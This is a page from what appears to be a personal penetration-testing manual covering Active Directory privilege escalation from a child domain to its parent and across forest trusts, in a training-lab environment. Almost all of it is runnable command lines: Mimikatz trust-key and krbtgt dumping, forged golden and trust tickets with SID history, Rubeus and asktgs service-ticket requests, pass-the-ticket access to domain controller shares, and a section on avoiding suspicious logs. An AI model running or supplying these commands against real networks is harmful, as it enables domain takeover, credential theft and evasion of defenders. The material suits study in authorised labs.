# Cross Forest Privilege Escalation

### Priv Esc – Child to Parent using Trust Tickets <a href="#priv-esc-child-to-parent-using-trust-tickets" id="priv-esc-child-to-parent-using-trust-tickets"></a>

```powershell
So, what is required to forge trust tickets is, obviously, the trust key. 
Look for [In] trust key from child to parent.

Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
or 

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'

An inter-realm TGT can be forged 
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1- 5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'

Child to Forest Root using Trust Tickets
• Get a TGS for a service (CIFS below) in the target domain by using the 
forged trust ticket using kikeo old. 

.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local

• Tickets for other services (like HOST and RPCSS for WMI, HOST and 
HTTP for PowerShell Remoting and WinRM) can be created as well.

Use the TGS to access the targeted service (may need to use it twice). 

.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$

We can use Rubeus too for same results! Note that we are still using the 
TGT forged initially
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorpdc.moneycorp.local /ptt

ls \\mcorp-dc.moneycorp.local\c$
```

### Child to Parent using krbtgt hash <a href="#child-to-parent-using-krbtgt-hash" id="child-to-parent-using-krbtgt-hash"></a>

```powershell
We will abuse SID history once again
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1- 5-21-280534878-1496970234-700767426-519 
/krbtgt:ff46a9d8bd66c6efd77603da26796f35 
/ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

On any machine of the current domain

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"' 
ls \\mcorp-dc.moneycorp.local.kirbi\c$
gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

Avoid suspicious logs
Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ 
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-
3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-
1496970234-700767426-516,S-1-5-9 
/krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'
Invoke-Mimikatz -Command '"lsadump::dcsync
/user:mcorp\Administrator /domain:moneycorp.local"' 

• sid = S-1-5-21-2578538781-2508153159-3419410681-516 – Domain Controllers
• sids = S-1-5-9 – Enterprise Domain Controllers (parent domain)
```

### Across Forest using Trust Tickets <a href="#across-forest-using-trust-tickets" id="across-forest-using-trust-tickets"></a>

```powershell
Once again, we require the trust key for the inter-forest trust.
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

An inter-forest TGT can be forged 
Invoke-Mimikatz -Command '"Kerberos::golden 
/user:Administrator /domain:dollarcorp.moneycorp.local
/sid:S-1-5-21-1874506631-3219952063-538504511 
/rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt
/target:eurocorp.local
/ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'

Get a TGS for a service (CIFS below) in the target domain by using the 
forged trust ticket. 
.\asktgs.exe
C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
CIFS/eurocorp-dc.eurocorp.local

Use the TGS to access the targeted service. 
.\kirbikator.exe lsa .\CIFS.eurocorpdc.eurocorp.local.kirbi
ls \\eurocorp-dc.eurocorp.local\forestshare\

Using Rubeus (using the same TGT which we forged earlier):
.\Rubeus.exe asktgs
/ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
/service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorpdc.eurocorp.local /ptt
ls \\eurocorp-dc.eurocorp.local\forestshare\
```

[\
](https://g37sys73m.gitbook.io/g37sys73ms-manual/active-directory/unconstrained-delegation)
